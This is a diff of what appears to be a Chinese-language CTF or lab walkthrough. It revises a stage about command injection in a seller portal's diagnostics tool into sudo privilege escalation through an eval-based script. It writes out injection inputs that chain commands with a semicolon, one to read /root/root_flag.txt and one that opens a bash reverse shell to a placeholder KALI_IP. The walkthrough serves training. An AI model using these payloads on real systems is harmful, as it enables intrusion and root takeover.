@@ -48,12 +48,17 @@
 *   **結果**：成功獲取終極 Flag。
 
 
-### 第七階段：指令注入與動態 Flag 生成 (Command Injection - CWE-77)
-*   **位置**：`/seller-portal` (賣家管理中心) 的「系統診斷工具」。
-*   **漏洞原理**：系統為了方便賣家排查上傳問題，提供了一個診斷介面。後端使用 `os.popen(command).read()` 直接執行用戶輸入的指令，未進行任何過濾。
-*   **動作**：利用此漏洞執行 Flag 生成腳本。該腳本預置於 `/root/flag.sh`，且當前 Web 服務用戶 `neo-user` 具有 sudo 免密碼執行權限。
-*   **利用方式**：在診斷工具中輸入 `echo "B11001001" | sudo /root/flag.sh`。
-*   **結果**：系統將根據學號動態生成專屬的 User Flag (`/home/neo-user/user_flag.txt`) 與 Root Flag (`/root/root_flag.txt`)。
+### 第七階段：指令注入與權限提升 (Command Injection & PrivEsc - CWE-78)
+*   **位置**：`/seller-portal` 的「系統診斷工具」。
+*   **漏洞原理**：系統允許賣家以 `sudo` 權限執行 `/root/flag.sh`。然而，該腳本在處理輸入時使用了危險的 `eval` 函數，且未對輸入進行過濾。
+*   **提權路徑**：攻擊者可以構造特殊的學號輸入，利用分號 (`;`) 拼接任意 Root 指令。
+*   **利用方式**：在診斷工具中輸入：
+    `412630567 ; cat /root/root_flag.txt` | `sudo /root/flag.sh`
+    *(註：實際操作中需透過管道符號傳遞輸入)*
+*   **更進階的利用 (Root Shell)**：
+    `412630567 ; bash -i >& /dev/tcp/KALI_IP/4444 0>&1` | `sudo /root/flag.sh`
+*   **結果**：成功以 Root 身分執行指令，獲取 **Root Flag** 或完全控制容器。
+
 
 ### 第八階段：跨權限讀取動態 Flag (Deep Path Traversal)
 *   **動作**：結合 CVE-2024-23334 漏洞與剛剛生成的檔案路徑，嘗試讀取系統深處的敏感檔案。
